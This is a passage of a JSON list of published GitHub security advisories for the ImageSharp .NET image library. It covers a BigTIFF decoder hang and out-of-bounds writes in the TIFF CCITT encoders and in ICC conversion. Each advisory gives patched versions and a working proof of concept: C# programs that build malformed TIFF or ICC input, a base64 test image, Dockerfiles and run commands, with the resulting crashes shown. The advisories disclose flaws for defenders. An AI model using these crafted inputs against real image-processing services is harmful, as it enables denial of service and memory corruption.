(linux-arm64)\nSDK: 8.0.424\nOS: Debian GNU/Linux 12 (bookworm), Docker\n```\n\n### Reproduction\n\nThe public `Image.Load(Stream)` call receives a 24-byte little-endian BigTIFF\nwith its first IFD at offset 16 and entry count `5000000000`. There are no bytes\nfor an entry. Run the supplied container under a five-second timeout.\n\nComplete observed output:\n\n```text\nbigTiffBytes=24 entryCount=5000000000\ntimeout exit status: 124\n```\n\n`timeout` exit code 124 means the decoder had not returned after five seconds.\n\nThe control is identical except the entry count is `1`:\n\n```text\nbigTiffBytes=24 entryCount=1\ndecoderReturned=InvalidImageContentException message=The TIFF image frame is missing the ImageWidth\nDocker exit status: 0\n```\n\nThe control rejects malformed input promptly; it does not time out.\n\nNo active exploitation is known.\n\n\n### Complete PoC files\n\nProgram.cs:\n\n```csharp\nusing SixLabors.ImageSharp;\n\nstatic class Program\n{\n    // Little-endian BigTIFF: a header, IFD at byte 16, and no IFD entry data.\n    // The count field is controlled by the input.\n    private static byte[] BuildBigTiff(ulong entryCount)\n    {\n        byte[] bytes = new byte[24];\n        bytes[0] = 0x49; bytes[1] = 0x49;               // II\n        bytes[2] = 0x2B; bytes[3] = 0x00;               // BigTIFF magic\n        bytes[4] = 0x08; bytes[5] = 0x00;               // 8-byte offsets\n        BitConverter.GetBytes((ulong)16).CopyTo(bytes, 8);\n        BitConverter.GetBytes(entryCount).CopyTo(bytes, 16);\n        return bytes;\n    }\n\n    private static void Main(string[] args)\n    {\n        ulong entryCount = ulong.Parse(args[0]);\n        byte[] bytes = BuildBigTiff(entryCount);\n        Console.Error.WriteLine($\"bigTiffBytes={bytes.Length} entryCount={entryCount}\");\n        try\n        {\n            using var stream = new MemoryStream(bytes);\n            using Image image = Image.Load(stream);\n            Console.Error.WriteLine(\"completed\");\n        }\n        catch (Exception ex)\n        {\n            Console.Error.WriteLine($\"decoderReturned={ex.GetType().Name} message={ex.Message}\");\n        }\n    }\n}\n\n```\n\nProject file:\n\n```xml\n<Project Sdk=\"Microsoft.NET.Sdk\">\n  <PropertyGroup>\n    <OutputType>Exe</OutputType>\n    <TargetFramework>net8.0</TargetFramework>\n    <ImplicitUsings>enable</ImplicitUsings>\n    <Nullable>enable</Nullable>\n  </PropertyGroup>\n  <!-- Directly load the DLL packaged by the published NuGet 4.1.1 release. -->\n  <ItemGroup>\n    <Reference Include=\"SixLabors.ImageSharp\">\n      <HintPath>/root/.nuget/packages/sixlabors.imagesharp/4.1.1/lib/net8.0/SixLabors.ImageSharp.dll</HintPath>\n    </Reference>\n    <Reference Include=\"System.IO.Hashing\">\n      <HintPath>/root/.nuget/packages/system.io.hashing/8.0.0/lib/net8.0/System.IO.Hashing.dll</HintPath>\n    </Reference>\n  </ItemGroup>\n</Project>\n\n```\n\nDockerfile:\n\n```dockerfile\nFROM mcr.microsoft.com/dotnet/sdk:8.0\nWORKDIR /work\nCOPY wmxv.csproj Program.cs ./\nRUN printf '%s\\n' '<Project Sdk=\"Microsoft.NET.Sdk\"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include=\"SixLabors.ImageSharp\" Version=\"4.1.1\" /></ItemGroup></Project>' > fetch.csproj \\\n    && dotnet restore fetch.csproj --nologo \\\n    && rm fetch.csproj \\\n    && dotnet build wmxv.csproj -c Release --nologo -v quiet\nENTRYPOINT [\"dotnet\", \"/work/bin/Release/net8.0/wmxv.dll\"]\n\n```\n\nRun:\n\n```sh\ndocker build -t imagesharp-wmxv-poc .\ntimeout 5 docker run --rm imagesharp-wmxv-poc 5000000000\ndocker run --rm imagesharp-wmxv-poc 1\n```\n",
+      "ghsa_id": "GHSA-wmxv-xphr-5c9g",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-wmxv-xphr-5c9g",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-wmxv-xphr-5c9g"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-106116"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-15T07:21:48Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "BigTIFF IFD count can keep a decoder thread in a non-progressing loop",
+      "updated_at": "2026-10-09T11:35:20Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-wmxv-xphr-5c9g",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.2.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 2.0.0, < 3.2.0"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "4.1.2",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0, < 4.1.2"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 4,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "MegaManSec",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/2505339?v=4",
+            "events_url": "https://api.github.com/users/MegaManSec/events{/privacy}",
+            "followers_url": "https://api.github.com/users/MegaManSec/followers",
+            "following_url": "https://api.github.com/users/MegaManSec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MegaManSec/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/MegaManSec",
+            "id": 2505339,
+            "login": "MegaManSec",
+            "node_id": "MDQ6VXNlcjI1MDUzMzk=",
+            "organizations_url": "https://api.github.com/users/MegaManSec/orgs",
+            "received_events_url": "https://api.github.com/users/MegaManSec/received_events",
+            "repos_url": "https://api.github.com/users/MegaManSec/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/MegaManSec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MegaManSec/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/MegaManSec",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-106115",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-787"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "description": "### Patched versions\n\nFixed in ImageSharp **3.2.0** and **4.1.2**. Users on v3 should upgrade to 3.2.0; users on v4 should upgrade to 4.1.2 or later.\n\n### Summary\n\nThe TIFF CCITT Group 4 (T6) encoder writes beyond its logical compressed-data buffer when encoding a 1-bit image. A valid 1×1 Group 4 TIFF decoded and re-encoded with the default `TiffEncoder` terminates the process with an unhandled exception.\n\n### Affected package and versions\n\n- Package: `SixLabors.ImageSharp` (NuGet)\n- Affected ranges: `>= 2.1.0, < 3.2.0` and `>= 4.0.0, < 4.1.2`\n- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.\n\nThe T6 compressor was introduced by commit `3c9eb470a07a15012c2a29ad84090dcc804a7975`, first released in v2.1.0, with the same `Width * rowsPerStrip` allocation and unchecked code writes. The 1×1 exploit terminates published v2.1.0 and v4.1.1; its uncompressed control succeeds. The capacity defect affects versions from v2.1.0 up to, but not including, v3.2.0, and v4 versions from v4.0.0 up to, but not including, v4.1.2.\n### Details\n\n[`TiffCcittCompressor.Initialize`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Formats/Tiff/Compression/Compressors/TiffCcittCompressor.cs#L527-L532) allocates `Width * rowsPerStrip` bytes. A 1×1 strip therefore receives one byte.\n\nAfter encoding the row, [`T6BitCompressor.CompressStrip`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Formats/Tiff/Compression/Compressors/T6BitCompressor.cs#L53-L131) appends two 12-bit EOFB codes. [`WriteCode`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Formats/Tiff/Compression/Compressors/TiffCcittCompressor.cs#L466-L479) writes those bits without checking the destination capacity. The final checked slice detects the oversized byte count and throws `ArgumentOutOfRangeException`, after the unchecked writes have exceeded the one-byte span.\n\nThe default TIFF encoder can inherit `CcittGroup4Fax` and 1-bit settings from decoded frame metadata. The reproduction uses that decode-and-re-encode path.\n\n### Tested environment\n\n- Published NuGet package: `SixLabors.ImageSharp` 4.1.1\n- Target framework: `net8.0`\n- .NET SDK: 8.0.424\n- .NET runtime: 8.0.30\n- Operating system: Debian GNU/Linux 12, ARM64, Docker\n\nNo active exploitation is known.\n\n### Reproduction\n\nCreate a `net8.0` project referencing the published 4.1.1 assembly and use this `Program.cs`:\n\n```csharp\nusing SixLabors.ImageSharp;\nusing SixLabors.ImageSharp.Formats.Tiff;\nusing SixLabors.ImageSharp.Formats.Tiff.Constants;\n\nstring mode = args.FirstOrDefault() ?? \"exploit\";\nbyte[] input = Convert.FromBase64String(\n    \"SUkqAAgAAAAJAAABAwABAAAAAQAAAAEBAwABAAAAAQAAAAIBAwABAAAAAQAAAAMBAwABAAAABAAAAAYBAwABAAAAAAAAABEBBAABAAAAegAAABUBAwABAAAAAQAAABYBBAABAAAAAQAAABcBBAABAAAABAAAAAAAAACACACA\");\n\nusing Image image = Image.Load(input);\nvar metadata = image.Frames.RootFrame.Metadata.GetTiffMetadata();\nConsole.WriteLine($\"ImageSharp={typeof(Image).Assembly.GetName().Version}\");\nConsole.WriteLine($\"mode={mode} decoded={image.Width}x{image.Height} compression={metadata.Compression} bits={metadata.BitsPerPixel}\");\n\nusing var output = new MemoryStream();\nif (mode == \"control\")\n{\n    image.Save(output, new TiffEncoder { Compression = TiffCompression.None });\n}\nelse\n{\n    image.Save(output, new TiffEncoder());\n}\n\nConsole.WriteLine($\"encoded=True bytes={output.Length}\");\n```\n\nRun:\n\n```text\ndotnet run -- exploit\ndotnet run -- control\n```\n\nThe exploit produced exit code 134:\n\n```text\nImageSharp=4.0.0.0\nmode=exploit decoded=1x1 compression=CcittGroup4Fax bits=Bit1\nUnhandled exception. System.ArgumentOutOfRangeException: Specified argument was out of the range of valid values.\n   at SixLabors.ImageSharp.Formats.Tiff.Compression.Compressors.TiffCcittCompressor.CompressStrip(Span`1 rows, Int32 height)\n```\n\nThe control completed with exit code 0:\n\n```text\nImageSharp=4.0.0.0\nmode=control decoded=1x1 compression=CcittGroup4Fax bits=Bit1\nencoded=True bytes=212\n```\n\n### Impact\n\nOne attacker-supplied Group 4 TIFF can select this unsafe encoder path when an application decodes it and re-encodes it with inherited TIFF metadata. The demonstrated result is an unhandled exception and process termination in the reproduction. The report is limited to the T6 encoder path.\n",
+      "ghsa_id": "GHSA-jjfr-hcj7-qf5w",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-jjfr-hcj7-qf5w",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-jjfr-hcj7-qf5w"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-106115"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-15T07:21:54Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "TIFF CCITT T6 encoder writes beyond an undersized output buffer",
+      "updated_at": "2026-10-09T11:35:24Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-jjfr-hcj7-qf5w",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.2.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 2.1.0, < 3.2.0"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "4.1.2",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0, < 4.1.2"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 6,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "MegaManSec",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/2505339?v=4",
+            "events_url": "https://api.github.com/users/MegaManSec/events{/privacy}",
+            "followers_url": "https://api.github.com/users/MegaManSec/followers",
+            "following_url": "https://api.github.com/users/MegaManSec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MegaManSec/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/MegaManSec",
+            "id": 2505339,
+            "login": "MegaManSec",
+            "node_id": "MDQ6VXNlcjI1MDUzMzk=",
+            "organizations_url": "https://api.github.com/users/MegaManSec/orgs",
+            "received_events_url": "https://api.github.com/users/MegaManSec/received_events",
+            "repos_url": "https://api.github.com/users/MegaManSec/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/MegaManSec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MegaManSec/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/MegaManSec",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-106110",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-787"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "description": "### Patched versions\n\nFixed in ImageSharp **3.2.0** and **4.1.2**. Users on v3 should upgrade to 3.2.0; users on v4 should upgrade to 4.1.2 or later.\n\n### Summary\n\nImageSharp's TIFF CCITT Group 3 (T4) encoder can write beyond its allocated compressed-data buffer when encoding narrow 1-bit images. The unchecked writes can corrupt process memory and terminate the process.\n\nThis report concerns only the T4 `CcittGroup3Fax` encoder path. It replaces the prior, unrelated ICC content.\n\n### Affected package and versions\n\n- Package: `SixLabors.ImageSharp` (NuGet)\n- Affected ranges: `>= 2.0.0, < 3.2.0` and `>= 4.0.0, < 4.1.2`\n- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.\n\nThe T4 encoder and its undersized buffer calculation first shipped in v2.0.0. The narrow-image exploit terminates published v2.0.0 and v4.1.1 while the same-height 64-pixel control succeeds on both. Releases from v2.0.0 up to, but not including, v3.2.0, and v4 releases from v4.0.0 up to, but not including, v4.1.2 retain the vulnerable allocation and unchecked bit-write structure.\n### Preconditions and impact\n\nThe affected path is reached when the application encodes 1-bit image data with `TiffCompression.CcittGroup3Fax`. This can happen when an application explicitly selects `TiffEncoder.BitsPerPixel = Bit1` and `TiffEncoder.Compression = CcittGroup3Fax`. It can also occur when an application decodes a TIFF and re-encodes it using the default `TiffEncoder`, because ImageSharp retains TIFF frame metadata including the compression and bit depth.\n\n`TiffCompressorFactory` creates `T4BitCompressor` for `CcittGroup3Fax`. `TiffCcittCompressor.Initialize` allocates `Width * rowsPerStrip` bytes, but non-modified T4 writes a 12-bit EOL before row data and an additional 12-bit EOL per row. `WriteCode` calls `BitWriterUtils.WriteBit` and `WriteZeroBit`, both of which use `Unsafe.Add` without a capacity check. Thus the encoded bit stream can exceed the allocated span.\n\nA 1-pixel-wide, 2000-row alternating bilevel image caused a fatal `System.AccessViolationException` during T4 compression. This is a memory-corruption and availability issue for applications that expose this encoding flow to attacker-controlled input.\n\n### Tested environment\n\n- Package binary: NuGet `SixLabors.ImageSharp` **4.1.1**\n- Target framework: `net8.0`\n- Runtime: .NET 8.0.30; SDK 8.0.424\n- Operating system: Debian GNU/Linux 12 (bookworm), Linux arm64, Docker\n\nNo active exploitation is known.\n\n### Reproduction\n\nIn a `net8.0` project that references the published `SixLabors.ImageSharp` 4.1.1 binary, save the following as `Program.cs`. Run `dotnet run -- exploit 2000` for the trigger and `dotnet run -- control 2000` for the control.\n\n```csharp\nusing System;\nusing System.IO;\nusing SixLabors.ImageSharp;\nusing SixLabors.ImageSharp.Formats.Tiff;\nusing SixLabors.ImageSharp.Formats.Tiff.Constants;\nusing SixLabors.ImageSharp.PixelFormats;\n\nstring mode = args.Length > 0 ? args[0] : \"exploit\";\nint width = mode == \"control\" ? 64 : 1;\nint height = args.Length > 1 ? int.Parse(args[1]) : 2000;\n\nConsole.WriteLine($\"mode={mode} width={width} height={height}\");\nusing var image = new Image<L8>(width, height);\nfor (int y = 0; y < image.Height; y++)\n    for (int x = 0; x < image.Width; x++)\n        image[x, y] = new L8((byte)(((x + y) & 1) == 0 ? 255 : 0));\n\nvar metadata = image.Frames.RootFrame.Metadata.GetTiffMetadata();\nmetadata.BitsPerPixel = TiffBitsPerPixel.Bit1;\nmetadata.Compression = TiffCompression.CcittGroup3Fax;\n\nusing var output = new MemoryStream();\nimage.Save(output, new TiffEncoder());\nConsole.WriteLine($\"Encoded OK: {output.Length} bytes\");\n```\n\nAgainst the published 4.1.1 package, this produced:\n\n```text\nmode=exploit width=1 height=2000\nFatal error. System.AccessViolationException: Attempted to read or write protected memory.\n  at ...TiffCcittCompressor.GetWhiteTermCode(...)\n  at ...T4BitCompressor.CompressStrip(...)\n```\n\nA 64-pixel-wide, 2000-row control using the same Group 3 metadata completed successfully:\n\n```text\nmode=control width=64 height=2000\nEncoded OK: 76230 bytes\n```\n\nThe direct public configuration path also triggers with:\n\n```csharp\nnew TiffEncoder\n{\n    BitsPerPixel = TiffBitsPerPixel.Bit1,\n    Compression = TiffCompression.CcittGroup3Fax\n};\n```\n",
+      "ghsa_id": "GHSA-j9gm-c75j-xc9q",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-j9gm-c75j-xc9q",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-j9gm-c75j-xc9q"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-106110"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-15T07:22:00Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "TIFF CCITT T4 encoder can write past its compressed output buffer",
+      "updated_at": "2026-10-09T11:35:28Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-j9gm-c75j-xc9q",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "3.2.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 2.0.0, < 3.2.0"
+        },
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "4.1.2",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0, < 4.1.2"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 4,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "MegaManSec",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/2505339?v=4",
+            "events_url": "https://api.github.com/users/MegaManSec/events{/privacy}",
+            "followers_url": "https://api.github.com/users/MegaManSec/followers",
+            "following_url": "https://api.github.com/users/MegaManSec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MegaManSec/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/MegaManSec",
+            "id": 2505339,
+            "login": "MegaManSec",
+            "node_id": "MDQ6VXNlcjI1MDUzMzk=",
+            "organizations_url": "https://api.github.com/users/MegaManSec/orgs",
+            "received_events_url": "https://api.github.com/users/MegaManSec/received_events",
+            "repos_url": "https://api.github.com/users/MegaManSec/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/MegaManSec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MegaManSec/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/MegaManSec",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-106112",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-787"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "description": "### Summary\n\nWhen ICC conversion is enabled, a malformed embedded ICC LUT16 profile with\nmore than four output channels can corrupt memory during ImageSharp color\nconversion. The ICC parser accepts up to 15 CLUT output channels, while the\nconversion implementation stores intermediate values in `Vector4`.\n\n### Affected package and versions\n\n- Package: `SixLabors.ImageSharp` (NuGet)\n- Affected published releases: **4.0.0, 4.1.0, and 4.1.1**\n- Affected range: `>= 4.0.0, <= 4.1.1`\n- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.\n\nThe reproduced `ColorProfileHandling.Convert` path and the unsafe `Vector4` LUT operations are present in v4.0.0 and unchanged through v4.1.1. The three-output control succeeds on all three published 4.x releases; the fifteen-output exploit terminates all three.\n\n### Details\n\n`IccClut` accepts one through fifteen input and output channels. In the\nreproduced `A2B0` LUT16 path, an attacker-controlled profile declares three\ninput channels and fifteen output channels. [`ClutCalculator.Calculate`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/ColorProfiles/Icc/Calculators/ClutCalculator.cs#L66-L87)\npasses a pointer to a four-float `Vector4` result into interpolation code that\nwrites one float per declared output channel. It consequently writes fifteen\nfloats. The same LUT16 tag also has fifteen output LUTs; their\n[`LutEntryCalculator.CalculateLut`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/ColorProfiles/Icc/Calculators/LutEntryCalculator.cs#L49-L58)\nimplementation uses `Unsafe.Add` from the first float of a four-float `Vector4`.\n\nAn application reaches this code by decoding an image containing the profile\nwith `DecoderOptions.ColorProfileHandling` set to `Convert`. `Preserve` is the\ndefault and does not run ICC conversion.\n\n### Reproduction environment and result\n\nThe supplied exploit and control were run against the published NuGet 4.1.1\n`net8.0` DLL in Docker on Debian 12 / Linux arm64 with .NET SDK 8.0.424 and\n.NET runtime 8.0.30.\n\nThe control changes only the declared output-channel count from fifteen to\nthree and completes successfully. The exploit terminates with exit status 139\nbefore it reaches the completion marker. This runtime PoC establishes memory\ncorruption in the combined LUT16 CLUT/output-LUT path; it does not isolate which\nunsafe write first corrupts the stack. The full self-contained Docker PoC is\nincluded below.\n\nComplete control output:\n\n```text\nmode=control output_channels=3\nimagesharp_assembly=/work/bin/Release/net8.0/SixLabors.ImageSharp.dll\nimagesharp_version=4.1.1+0815358f9202a78bc7f3b83e19282dc3654b500f\npng_bytes=204\ndecode_completed\nDocker exit status: 0\n```\n\nComplete exploit output:\n\n```text\nmode=exploit output_channels=15\nimagesharp_assembly=/work/bin/Release/net8.0/SixLabors.ImageSharp.dll\nimagesharp_version=4.1.1+0815358f9202a78bc7f3b83e19282dc3654b500f\npng_bytes=207\nDocker exit status: 139\n```\n\nNo active exploitation is known.\n\n### Impact\n\nApplications that enable ICC conversion while processing attacker-supplied\nimages can be made to terminate through memory corruption in the reproduced\nLUT16 CLUT/output-LUT path. This report is limited to output-channel counts\ngreater than four in that path; it does not claim a TRC issue or other\nunreproduced ICC paths.\n\n\n### Complete PoC files\n\nProgram.cs:\n\n```csharp\nusing System;\nusing System.Buffers.Binary;\nusing System.IO;\nusing System.Reflection;\nusing System.Text;\nusing SixLabors.ImageSharp;\nusing SixLabors.ImageSharp.Formats;\nusing SixLabors.ImageSharp.Metadata.Profiles.Icc;\nusing SixLabors.ImageSharp.PixelFormats;\n\nstatic class Program\n{\n    private static void U32(Stream stream, uint value)\n    {\n        Span<byte> bytes = stackalloc byte[4];\n        BinaryPrimitives.WriteUInt32BigEndian(bytes, value);\n        stream.Write(bytes);\n    }\n\n    private static void U16(Stream stream, ushort value)\n    {\n        Span<byte> bytes = stackalloc byte[2];\n        BinaryPrimitives.WriteUInt16BigEndian(bytes, value);\n        stream.Write(bytes);\n    }\n\n    private static void Fixed16(Stream stream, double value) => U32(stream, unchecked((uint)(int)Math.Round(value * 65536D)));\n\n    // A valid-enough RGB-to-XYZ LUT16 A2B0 profile. The only exploit/control\n    // difference is outCh: 15 is accepted by ICC parsing but cannot fit Vector4.\n    private static byte[] BuildIcc(int outCh)\n    {\n        const int inCh = 3;\n        const int clutPoints = 2;\n        const int tableEntries = 2;\n        using var stream = new MemoryStream();\n\n        byte[] header = new byte[128];\n        BinaryPrimitives.WriteUInt32BigEndian(header.AsSpan(8), 0x04300000); // ICC v4.3\n        Encoding.ASCII.GetBytes(\"mntr\").CopyTo(header, 12); // display device\n        Encoding.ASCII.GetBytes(\"RGB \").CopyTo(header, 16);\n        Encoding.ASCII.GetBytes(\"XYZ \").CopyTo(header, 20);\n        stream.Write(header);\n\n        U32(stream, 1);                 // one tag\n        stream.Write(Encoding.ASCII.GetBytes(\"A2B0\"));\n        long offsetField = stream.Position; U32(stream, 0);\n        long sizeField = stream.Position; U32(stream, 0);\n        long tagStart = stream.Position;\n\n        